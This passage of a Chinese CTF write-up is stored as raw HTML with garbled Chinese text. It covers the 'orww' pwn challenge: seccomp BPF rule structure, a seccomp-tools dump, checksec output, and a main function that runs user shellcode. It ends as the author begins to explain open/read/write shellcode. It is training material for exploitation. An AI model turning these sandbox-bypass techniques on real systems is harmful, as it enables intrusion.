class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>C AD                            db <span class="hljs-number">0</span>ADh<br></code></pre></td></tr></tbody></table></figure><p>å¥½å®¶ä¼™ï¼Œæˆ‘ç›´æ¥çœ‹ä¸æ‡‚ã€‚ä½†æ˜¯å…¶å®è¿™äº›å†…å®¹å·²ç»åœ¨å‰é¢å‡ºç°è¿‡ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWNé¢˜/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure><blockquote><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºç°åœ¨åªæœ‰openã€writeã€readã€sigreturnè¿™å››ä¸ªç³»ç»Ÿè°ƒç”¨å¯ä»¥ä½¿ç”¨ã€‚<br>å¯¹ç…§ä¸€ä¸‹ï¼Œæ˜¯ä¸æ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Ÿä½†æ˜¯è¿™äº›å†…å®¹åˆæ„å‘³è¿™ä»€ä¹ˆï¼Ÿä¸Šé¢çš„lineã€CODEã€JTã€JFã€Kåˆæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</p></blockquote><h2 id="BPF-è§„åˆ™ä»‹ç»"><a href="#BPF-è§„åˆ™ä»‹ç»" class="headerlink" title="BPF è§„åˆ™ä»‹ç»"></a><strong>BPF è§„åˆ™ä»‹ç»</strong></h2><p>Qï¼šBPFæ˜¯æ•°æ®é“¾è·¯å±‚ä¸Šçš„ä¸€ç§æ¥å£ï¼Œå®ƒæ€ä¹ˆä¼šå‡ºç°åœ¨ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Ÿ</p><p>Aï¼šå…¶å®è¿™åŸæœ¬æ˜¯TCPåè®®åŒ…çš„è¿‡æ»¤è§„åˆ™æ ¼å¼ï¼Œåé¢è¢«å¼•ç”¨ä¸ºæ²™ç®±è§„åˆ™ã€‚</p><hr><p>ç®€å•çš„è¯´BPFå®šä¹‰äº†ä¸€ä¸ªä¼ªæœºå™¨ã€‚è¿™ä¸ªä¼ªæœºå™¨å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæœ‰ä¸€ä¸ªç´¯åŠ å™¨ï¼Œå¯„å­˜å™¨ï¼ˆRegAï¼‰ï¼Œå’Œèµ‹å€¼ã€ç®—æœ¯ã€è·³è½¬æŒ‡ä»¤ã€‚ä¸€æ¡æŒ‡ä»¤ç”±ä¸€ä¸ªå®šä¹‰å¥½çš„ç»“æ„struct bpf_insnè¡¨ç¤ºï¼Œä¸çœŸæ­£çš„æœºå™¨ä»£ç å¾ˆç›¸ä¼¼ï¼Œè‹¥å¹²ä¸ªè¿™æ ·çš„ç»“æ„ç»„æˆçš„æ•°ç»„ï¼Œå°±æˆä¸º BPF çš„æŒ‡ä»¤åºåˆ—ã€‚</p><p>&amp;progæ˜¯æŒ‡å‘å¦‚ä¸‹ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè¿™ä¸ªç»“æ„ä½“è®°å½•äº†è¿‡æ»¤è§„åˆ™ä¸ªæ•°ä¸è§„åˆ™æ•°ç»„èµ·å§‹ä½ç½®:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> {</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>      len;    <span class="hljs-comment">/* Number of BPF instructions */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <span class="hljs-comment">/* Pointer to array of BPF instructions */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>è€ŒfilteråŸŸå°±æŒ‡å‘äº†å…·ä½“çš„è§„åˆ™ï¼Œæ¯ä¸€æ¡è§„åˆ™æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> {</span>            <span class="hljs-comment">/* Filter block */</span><br>    __u16 code;                 <span class="hljs-comment">/* Actual filter code */</span><br>    __u8  jt;                   <span class="hljs-comment">/* Jump true */</span><br>    __u8  jf;                   <span class="hljs-comment">/* Jump false */</span><br>    __u32 k;                    <span class="hljs-comment">/* Generic multiuse field */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>ä¸ºäº†æ“ä½œæ–¹ä¾¿å®šä¹‰äº†ä¸€ç»„å®æ¥å®Œæˆfilterçš„å¡«å†™(å®šä¹‰åœ¨/usr/include/linux/bpf_common.h)ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_STMT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_JUMP</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></tbody></table></figure><p>æ ·ä¼šç®€å•ä¸€ç‚¹ï¼Œå†æ¥çœ‹çœ‹codeï¼Œå®ƒæ˜¯ç”±å¤šä¸ªâ€å•è¯â€ç»„æˆçš„â€çŸ­è¯­â€ï¼Œç±»ä¼¼â€åŠ¨å®¾ç»“æ„â€ï¼Œâ€å•è¯â€é—´ä½¿ç”¨â€+â€è¿æ¥ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)         <span class="hljs-comment">//é¦–å…ˆæŒ‡å®šæ“ä½œçš„ç±»åˆ«</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LD0x00                    <span class="hljs-comment">//å°†å€¼cpè¿›å¯„å­˜å™¨</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LDX0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ST0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_STX0x03</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ALU0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JMP0x05</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_RET0x06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MISC    0x07</span><br><br><span class="hljs-comment">/* ld/ldx fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="hljs-comment">//åœ¨ldæ—¶æŒ‡å®šæ“ä½œæ•°çš„å¤§å°</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_W0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_H0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_B0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="hljs-comment">//æ“ä½œæ•°ç±»å‹</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_IMM0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ABS0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_IND0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MEM0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LEN0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MSH0xa0</span><br><br><span class="hljs-comment">/* alu/jmp fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="hljs-comment">//å½“æ“ä½œç ç±»å‹ä¸ºALUæ—¶ï¼ŒæŒ‡å®šå…·ä½“è¿ç®—ç¬¦</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ADD0x00                    <span class="hljs-comment">//åˆ°åº•æ‰§è¡Œä»€ä¹ˆæ“ä½œå¯ä»¥çœ‹filter.hé‡Œé¢çš„å®šä¹‰</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_SUB0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MUL0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_DIV0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_OR0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_AND0x50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LSH0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_RSH0x70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_NEG0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MOD0x90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_XOR0xa0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JA0x00                    <span class="hljs-comment">//å½“æ“ä½œç ç±»å‹æ˜¯JMPæ—¶æŒ‡å®šè·³è½¬ç±»å‹</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JEQ0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JGT0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JGE0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JSET        0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_K0x00                    <span class="hljs-comment">//å¸¸æ•°</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_X0x08</span><br></code></pre></td></tr></tbody></table></figure><p>å¦å¤–ä¸SECCOMPæœ‰å…³çš„å®šä¹‰åœ¨/usr/include/linux/seccomp.hï¼Œç°åœ¨æ¥çœ‹çœ‹æ€ä¹ˆå†™è§„åˆ™ï¼Œé¦–å…ˆæ˜¯BPF_LDï¼Œå®ƒéœ€è¦ç”¨åˆ°çš„ç»“æ„ä¸ºï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_data</span> {</span><br>    <span class="hljs-type">int</span>   nr;                   <span class="hljs-comment">/* System call number */</span><br>    __u32 arch;                 <span class="hljs-comment">/* AUDIT_ARCH_* value</span><br><span class="hljs-comment">                                  (åœ¨ &lt;linux/audit.h&gt; é‡Œ) */</span><br>    __u64 instruction_pointer;  <span class="hljs-comment">/* CPU instruction pointer */</span><br>    __u64 args[<span class="hljs-number">6</span>];              <span class="hljs-comment">/* Up to 6 system call arguments */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­argsä¸­æ˜¯6ä¸ªå¯„å­˜å™¨ï¼Œåœ¨32ä½ä¸‹æ˜¯ï¼šebx,ecx,edx,esi,edi,ebpï¼Œåœ¨64ä½ä¸‹æ˜¯ï¼šrdi,rsi,rdx,r10,r8,r9ï¼Œç°åœ¨è¦å°†syscallæ—¶eaxçš„å€¼è½½å…¥RegAï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//è¿™ä¼šæŠŠåç§»0å¤„çš„å€¼æ”¾è¿›å¯„å­˜å™¨Aï¼Œè¯»å–çš„æ˜¯seccomp_dataçš„æ•°æ®</span><br><span class="hljs-comment">//æˆ–è€…</span><br>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))<br></code></pre></td></tr></tbody></table></figure><p>è€Œè·³è½¬è¯­å¥å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)               <br><span class="hljs-comment">//è¿™å›æŠŠå¯„å­˜å™¨Aä¸å€¼k(æ­¤å¤„ä¸º59)ä½œæ¯”è¾ƒï¼Œä¸ºçœŸè·³è¿‡ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¸ºå‡ä¸è·³è½¬</span><br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­åä¸¤ä¸ªå‚æ•°ä»£è¡¨æˆåŠŸè·³è½¬åˆ°ç¬¬å‡ æ¡è§„åˆ™ï¼Œå¤±è´¥è·³è½¬åˆ°ç¬¬å‡ æ¡è§„åˆ™ï¼Œè¿™æ˜¯ç›¸å¯¹åç§»ã€‚<br>æœ€åå½“éªŒè¯å®Œæˆéœ€è¦è¿”å›ç»“æœï¼Œå³æ˜¯å¦å…è®¸ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)<br></code></pre></td></tr></tbody></table></figure><p>è¿‡æ»¤çš„è§„åˆ™åˆ—è¡¨é‡Œå¯ä»¥æœ‰å¤šæ¡è§„åˆ™ï¼Œseccompä¼šä»ç¬¬0æ¡å¼€å§‹é€æ¡æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°BPF_RETè¿”å›ï¼Œå†³å®šæ˜¯å¦å…è®¸è¯¥æ“ä½œä»¥åŠåšæŸäº›ä¿®æ”¹ã€‚<br>æ€»ç»“ä¸€ä¸‹ï¼š</p><ol><li><strong>ç»“æ„èµ‹å€¼æ“ä½œæŒ‡ä»¤ä¸º</strong>ï¼šBPF_STMTã€BPF_JUMP</li><li><strong>BPF çš„ä¸»è¦æŒ‡ä»¤æœ‰</strong> BPF_LDï¼ŒBPF_ALUï¼ŒBPF_JMPï¼ŒBPF_RET ç­‰ã€‚BPF_LD å°†æ•°æ®è£…å…¥ç´¯åŠ å™¨ï¼ŒBPF_ALU å¯¹ç´¯åŠ å™¨æ‰§è¡Œç®—æœ¯å‘½ä»¤ï¼ŒBPF_JMP æ˜¯è·³è½¬æŒ‡ä»¤ï¼ŒBPF_RET æ˜¯ç¨‹åºè¿”å›æŒ‡ä»¤</li><li>BPF æ¡ä»¶åˆ¤æ–­è·³è½¬æŒ‡ä»¤ï¼šBPF_JMPã€BPF_JEQï¼Œæ ¹æ®åé¢çš„å‡ ä¸ªå‚æ•°è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åè·³è½¬åˆ°ç›¸åº”çš„åœ°æ–¹ã€‚</li><li><strong>è¿”å›æŒ‡ä»¤</strong>ï¼šBPF_RETã€BPF_Kï¼Œè¿”å›åé¢å‚æ•°çš„å€¼</li></ol><p>ä¾‹å¦‚ByteCTFä¸­ä¸€é“å †é¢˜çš„sock_filterç»“æ„ä½“å¦‚ä¸‹ï¼ˆå’Œæ­¤ç¯‡æ–‡ç« ä¸­çš„é¢˜ç›®æ— å…³ï¼Œä»…ä¾›å‚è€ƒï¼‰</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> {<br>    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),          <span class="hljs-comment">// ä»ç¬¬0ä¸ªå­—èŠ‚ä½ç½®å¼€å§‹ï¼ŒåŠ è½½è¯»å–ç³»ç»Ÿè°ƒç”¨å·</span><br>    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="hljs-number">257</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),       <span class="hljs-comment">// æ¯”è¾ƒç³»ç»Ÿè°ƒç”¨å·æ˜¯å¦ä¸º 257ï¼ˆ257 æ˜¯ openat çš„ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œæ˜¯å°±è·³åˆ°ç¬¬5è¡Œ</span><br>    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),         <span class="hljs-comment">// æ¯”è¾ƒç³»ç»Ÿè°ƒç”¨å·æ˜¯å¦å¤§äº 0ï¼Œæ˜¯å°±è·³åˆ°ç¬¬6è¡Œ</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="hljs-comment">// æ‹’ç»ç³»ç»Ÿè°ƒç”¨ï¼Œè¿”å› 0</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="hljs-comment">// å…è®¸ç³»ç»Ÿè°ƒç”¨</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>æ‹¿æœ¬é¢˜çš„sock_filterç»“æ„ä½“è¯´æ˜ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br></code></pre></td></tr></tbody></table></figure><p>line 1è¡¨ç¤ºè¿™é“é¢˜éœ€è¦è¿è¡Œåœ¨æ¶æ„ä¸ä¸ºi386çš„æœºå™¨æˆ–ç¯å¢ƒä¸­ï¼Œå¦åˆ™ç›´æ¥è¿”å›ERRORã€‚<br>line 8è¡¨ç¤ºå¦‚æœä¼ å…¥çš„ç³»ç»Ÿè°ƒç”¨å·ä¸ºreadï¼Œåˆ™å…è®¸æ‰§è¡Œï¼Œå¦åˆ™ç›´æ¥ç»“æŸè¿›ç¨‹ã€‚</p><h2 id="å¼€å§‹è§£é¢˜"><a href="#å¼€å§‹è§£é¢˜" class="headerlink" title="å¼€å§‹è§£é¢˜"></a>å¼€å§‹è§£é¢˜</h2><p>ç»è¿‡å‰é¢çš„åˆ†ææˆ‘ä»¬å·²ç»çŸ¥é“äº†æ­¤é¢˜åªèƒ½ä½¿ç”¨åªèƒ½ä½¿ç”¨ readã€writeã€_exitã€openã€‚<br>è€è§„çŸ©ï¼Œæ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWNé¢˜/Range/pwnable.xyz$ checksec orww<br>[*] <span class="hljs-string">'/mnt/hgfs/PWN\xe9\xa2\x98/Range/pwnable.xyz/orww'</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹åˆ°ç¨‹åºä¸º32ä½ï¼Œåªå¼€å¯äº†NXä¿æŠ¤ã€‚mainå‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>å¾ˆç®€å•ï¼Œè¾“å…¥shellcodeä¹‹åç¨‹åºå°±ä¼šæ‰§è¡Œå®ƒã€‚<br>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œsystemå’Œexecveéƒ½è¢«ç¦ç”¨äº†æ€ä¹ˆåŠï¼Ÿ<br>è¯»å–flagçš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œè™½ç„¶æ— æ³•æ‹¿åˆ°shellï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨openã€readã€writeä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å»è¯»flagï¼Œflagæ”¾åœ¨äº†/home/orw/flagã€‚<br>åŒæ—¶é¢˜ç›®å·²ç»ç»™äºˆäº†è¿™ä¸ªæç¤ºï¼š</p><p>å› æ­¤è¿™é‡Œè€ƒéªŒæˆ‘ä»¬ç›´æ¥ç¼–å†™shellcodeçš„èƒ½åŠ›ï¼Œè¿™é‡Œæ³¨æ„<br>â€¢ å¯¹äº32ä½ç¨‹åºï¼Œåº”è°ƒç”¨int $0x80è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥eaxï¼Œå„ä¸ªå‚æ•°æŒ‰ç…§ebxã€ecxã€edxçš„é¡ºåºä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å›å€¼å‚¨å­˜åˆ°eaxå¯„å­˜å™¨ã€‚<br>â€¢ å¯¹äº64ä½ç¨‹åºï¼Œåº”è°ƒç”¨syscallè¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ 